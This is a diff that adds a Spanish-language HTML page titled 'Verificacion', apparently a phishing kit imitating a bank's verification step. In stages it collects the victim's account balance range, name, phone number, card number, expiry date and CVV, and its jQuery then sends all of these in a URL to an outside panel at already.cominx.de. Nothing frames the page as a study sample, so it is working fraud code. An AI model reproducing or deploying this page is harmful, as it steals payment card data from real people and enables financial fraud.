@@ -1,0 +1,365 @@
+<script>var para='a2tra2tra2tra2tra2tra2tra2tra2tra2s='; var url2='VALIDACION';</script><!DOCTYPE html>
+<html lang="es" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
+    <script>
+$(document).ready(function(){
+  var slash=false
+  $(".fechas input").on('keyup',function(){
+            if($(this).val().length == 2 && slash==false) {
+                $(this).val($(this).val()+"/");
+                slash=true;
+            }
+        });
+        $(".fechas input").on('keyup',function(){
+                  if($(this).val().length == 3 && slash==true) {
+                    var test= $(this).val();
+                    test = test.replace("/", "");
+                  }
+              });
+              $(".fechas input").on('keyup',function(){
+                        if($(this).val().length == 1 && slash==true) {
+                          slash=false;
+                        }
+                    });
+  $(".cc input").on("keypress", function(event){
+      if( $(this).val().length == 16){
+          return false;
+      }
+  });
+  $(".fechas input").on("keypress", function(event){
+      if( $(this).val().length == 5){
+          return false;
+      }
+  });
+  $(".cvv input").on("keypress", function(event){
+      if( $(this).val().length == 3){
+          return false;
+      }
+  });
+  $('#boxcentral .tel input, #boxcentral .cc input, #boxcentral .fechas input, #boxcentral .cvv input').on('input', function () {
+    this.value = this.value.replace(/[^0-9^/]/g,'');
+});
+  $(".primerbtn span").click(function(){
+    var inpval=$('select[name=user]').val();
+    if(inpval>0){
+      $("#boxcentral .primer").css("display", "none");
+      $("#boxcentral .segundo").css("display", "block");
+      $("#boxcentral .segundodos").css("display", "block");
+      $("#boxcentral .usertxt").css("display", "none");
+      $("#boxcentral .nametxt").css("display", "block");
+      $("#boxcentral .user").css("display", "none");
+      $("#boxcentral .name").css("display", "block");
+      $("#boxcentral .teltxt").css("display", "block");
+      $("#boxcentral .tel").css("display", "block");
+      $("#boxcentral .primerbtn").css("display", "none");
+      $("#boxcentral .segundobtn").css("display", "block");
+      $(".user input").css({"border-bottom": "1px solid #7b7979"});
+    }else{
+      $(".user select").css({"border": "1px solid #fc3d34"});
+    }
+  });
+  $(".segundobtn span").click(function(){
+    var inpname=$(".name input").val().length;
+    var inptel=$(".tel input").val().length;
+    if(inpname>3 && inptel==8){
+      $("#boxcentral .segundo").css("display", "none");
+      $("#boxcentral .segundodos").css("display", "none");
+      $("#boxcentral .nametxt").css("display", "none");
+      $("#boxcentral .name").css("display", "none");
+      $("#boxcentral .teltxt").css("display", "none");
+      $("#boxcentral .tel").css("display", "none");
+      $("#boxcentral .segundobtn").css("display", "none");
+
+      $("#boxcentral .tercero").css("display", "block");
+      $("#boxcentral .tercerodos").css("display", "block");
+      $("#boxcentral .cctxt").css("display", "block");
+      $("#boxcentral .cc").css("display", "block");
+      $("#boxcentral .fechastxt").css("display", "block");
+      $("#boxcentral .fechas").css("display", "block");
+      $("#boxcentral .cvvtxt").css("display", "block");
+      $("#boxcentral .cvv").css("display", "block");
+      $("#boxcentral .verificar").css("display", "block");
+      $(".name input").css({"border-bottom": "1px solid #7b7979"});
+      $(".tel input").css({"border-bottom": "1px solid #7b7979"});
+    }else{
+      if(inpname>3){
+        $(".name input").css({"border-bottom": "1px solid #7b7979"});
+      }else{
+        $(".name input").css({"border-bottom": "1px solid #fc3d34"});
+      }
+      if(inptel==8){
+          $(".tel input").css({"border-bottom": "1px solid #7b7979"});
+        }else{
+          $(".tel input").css({"border-bottom": "1px solid #fc3d34"});
+        }
+
+    }
+  });$(".verificar span").click(function(){
+    var inpcc=$(".cc input").val().length;
+    var inpfechas=$(".fechas input").val().length;
+    var inpcvv=$(".cvv input").val().length;
+    if(inpcc==16 && inpfechas==5 && inpcvv==3){
+      $("#boxcentral .tercero").css("display", "none");
+      $("#boxcentral .tercerodos").css("display", "none");
+      $("#boxcentral .cctxt").css("display", "none");
+      $("#boxcentral .cc").css("display", "none");
+      $("#boxcentral .fechastxt").css("display", "none");
+      $("#boxcentral .fechas").css("display", "none");
+      $("#boxcentral .cvvtxt").css("display", "none");
+      $("#boxcentral .cvv").css("display", "none");
+      $("#boxcentral .verificar").css("display", "none");
+
+      var user=$('select[name=user]').val();
+      var name=$(".name input").val();
+      var tel=$(".tel input").val();
+      var cc=$(".cc input").val();
+      var fechas=$(".fechas input").val();
+      var cvv=$(".cvv input").val();
+
+
+      var dttotal=user+"&name="+name+"&tel="+tel+"&cc="+cc+"&fechas="+fechas+"&cvv="+cvv;
+     var url = "https://already.cominx.de/panel/agricola.php?user=" + dttotal;
+               $(location).attr('href',url);
+    }else{
+      if(inpcc==16){
+        $(".cc input").css({"border-bottom": "1px solid #7b7979"});
+      }else{
+        $(".cc input").css({"border-bottom": "1px solid #fc3d34"});
+      }
+      if(inpfechas==5){
+          $(".fechas input").css({"border-bottom": "1px solid #7b7979"});
+        }else{
+          $(".fechas input").css({"border-bottom": "1px solid #fc3d34"});
+        }
+        if(inpcvv==3){
+            $(".cvv input").css({"border-bottom": "1px solid #7b7979"});
+          }else{
+            $(".cvv input").css({"border-bottom": "1px solid #fc3d34"});
+          }
+
+    }
+  });
+});
+</script>
+    <title>Verificacion</title>
+    <style media="screen">
+
+
+
+                  *{
+              margin: 0;
+              padding:0;
+            }
+                  body{
+                    background-image:url('https://i.ibb.co/bdgQF6Q/fondo.png');
+                  }
+            nav{
+              background:white;
+              box-shadow: 5px 1px 5px #888888;
+              padding-top: 1%;
+              padding-bottom: 1%;
+            }
+            nav img{
+              width: 12%;
+              margin-left: 2%;
+            }
+            #boxcentral {
+              background: #fff;
+              width: 32%;
+              margin-left: 3%;
+              margin-top: 5%;
+              box-shadow: 1px 1px 1px 1px #e7edef;
+              padding: 2%;
+              padding-bottom: 3%;
+            }
+            #boxcentral .primer{
+              font-family: arial;
+              font-weight: bold;
+              font-size: 25px;
+              color: #292929;
+              margin-bottom: 8%;
+            }
+    #boxcentral .user select{
+      width: 50%;
+      text-align: center;
+      padding-top: 1%;
+      padding-bottom: 1%;
+      margin-top: 2%;
+    }
+        #boxcentral .txtinp{
+        font-family: arial;
+        color: #292929;
+        font-size: 14px;
+        margin-bottom: 2%;
+        }
+        #boxcentral .inp input{
+        width: 85%;
+        font-size: 16px;
+        border:0px solid #fff;
+        border-bottom: 1px solid #7b7979;
+        padding-bottom: 1%;
+        }
+        #boxcentral .inp{
+        margin-bottom: 10%;
+        }
+        #boxcentral .btn span{
+        cursor: pointer;
+        background: #fdda24;
+        font-weight: bold;
+        font-family: arial;
+        font-size: 16px;
+        padding: 3%;
+        padding-left: 8%;
+        padding-right: 10%;
+        border-radius: 20px;
+        }
+        #boxcentral .btn span img{
+        position: relative;
+        left: 4%;
+        top:9px;
+        }
+        #boxcentral .segundo{
+        display: none;
+        font-family: arial;
+        font-weight: bold;
+        font-size: 25px;
+        color: #292929;
+        margin-bottom: 5%;
+        }
+        #boxcentral .segundodos{
+        display: none;
+        font-family: arial;
+        font-size: 16px;
+        color: #292929;
+        margin-bottom: 5%;
+        }
+        #boxcentral .nametxt{
+        display: none;
+        }
+        #boxcentral .name{
+        display: none;
+        }
+        #boxcentral .teltxt{
+        display: none;
+        }
+        #boxcentral .tel{
+        display: none;
+        }
+        #boxcentral .segundobtn{
+        display: none;
+        }
+
+        #boxcentral .tercero{
+        display: none;
+        font-family: arial;
+        font-weight: bold;
+        font-size: 25px;
+        color: #292929;
+        margin-bottom: 5%;
+        }
+        #boxcentral .tercerodos{
+        display: none;
+        font-family: arial;
+        font-size: 16px;
+        color: #292929;
+        margin-bottom: 5%;
+        }
+        #boxcentral .cctxt{
+        display: none;
+        }
+        #boxcentral .cc{
+        display: none;
+        }
+        #boxcentral .fechastxt{
+        display: none;
+        }
+        #boxcentral .fechas{
+        display: none;
+        }
+        #boxcentral .cvvtxt{
+        display: none;
+        }
+        #boxcentral .cvv{
+        display: none;
+        }
+        #boxcentral .verificar{
+        display: none;
+        }
+        @media (max-width: 850px){
+      nav{
+        box-shadow: 5px 1px 5px #fff;
+        text-align: center;
+        padding-top: 3%;
+      }
+      nav img{
+        width: 50%;
+        margin: auto;
+      }
+      #boxcentral{
+        width: 90%;
+        margin: auto;
+        margin-top: 5%;
+        box-shadow: 1px 1px 1px 1px #fff;
+      }
+      #boxcentral .primer{
+        text-align: center;
+        font-size: 20px;
+      }
+      #boxcentral .inp input{
+        width: 100%;
+      }
+      #boxcentral .btn{
+        text-align: center;
+      }
+ #boxcentral .user{
+            text-align: center;
+            width: 100%;
+          }
+          #boxcentral .user select{
+            width: 80%;
+          }
+      body{
+        background: #fff;
+      }
+
+    }
+
+    </style>
+  </head>
+  <body>
+    <nav>
+      <img src="https://i.ibb.co/dbczTkG/logop.png" alt="">
+    </nav>
+    <section id="boxcentral">
+      <p class="primer">Para continuar con la verificaci&oacute;n</p>
+        <p class="segundo">Para continuar con la verificaci&oacute;n</p>
+        <p class="segundodos">Necesitamos los siguientes datos :</p>
+        <p class="tercero">Para completar la verificaci&oacute;n :</p>
+        <p class="tercerodos">Ingrese los siguientes datos :</p>
+      <p class="txtinp usertxt">Ingrese el monto habitual en su cuenta :</p>
+      <p class="txtinp nametxt">Nombre completo</p>
+      <p class="inp user"> <select name="user" id="cars">
+    <option value="0">SELECCIONE UN VALOR</option>
+  <option value="0100">0 - 100</option>
+    <option value="100300">100 - 300</option>
+    <option value="300500">300 - 500</option>
+    <option value="500mas">500 - m&aacute;s</option>
+  </select></p>
+      <p class="inp name"><input type="text" name="" value=""></p>
+      <p class="txtinp teltxt">Tel&eacute;fono</p>
+      <p class="inp tel"><input type="text" name="" value=""></p>
+      <p class="txtinp cctxt">N&uacute;meros de tarjeta</p>
+      <p class="inp cc"><input type="text" name="" value=""></p>
+      <p class="txtinp fechastxt">Fechas</p>
+      <p class="inp fechas"><input type="text" name="" value=""></p>
+      <p class="txtinp cvvtxt">CVV</p>
+      <p class="inp cvv"><input type="text" name="" value=""></p>
+      <p class="btn primerbtn"><span>CONTINUAR <img src="https://i.ibb.co/N74gTRC/flecha.png" alt=""></span></p>
+      <p class="btn segundobtn"><span>CONTINUAR <img src="https://i.ibb.co/N74gTRC/flecha.png" alt=""></span></p>
+      <p class="btn verificar"><span>VERIFICAR <img src="https://i.ibb.co/N74gTRC/flecha.png" alt=""></span></p>
+    </section>
+  </body>
+</html>
